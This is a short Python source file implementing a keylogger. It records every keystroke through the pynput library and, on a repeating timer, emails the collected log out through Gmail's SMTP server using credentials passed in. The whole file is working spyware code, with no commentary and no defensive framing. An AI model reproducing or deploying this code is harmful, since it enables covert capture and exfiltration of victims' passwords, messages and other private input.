#!/usr/bin/env python
import smtplib
import pynput
import threading


class Keylogger:
    def __init__(self, interval, email, password):
        self.log = ""
        self.interval = interval
        self.email = email
        self.password = password

    def append_log(self, string):
        self.log = self.log + string

    def keylog(self, key):
        try:
            pressed_key = str(key.char)
        except AttributeError:
            if key == key.space:
                pressed_key = " "
            else:
                pressed_key = " " + str(key) + " "
        self.append_log(pressed_key)

    def report(self):
        print(self.log)
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.keylog)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
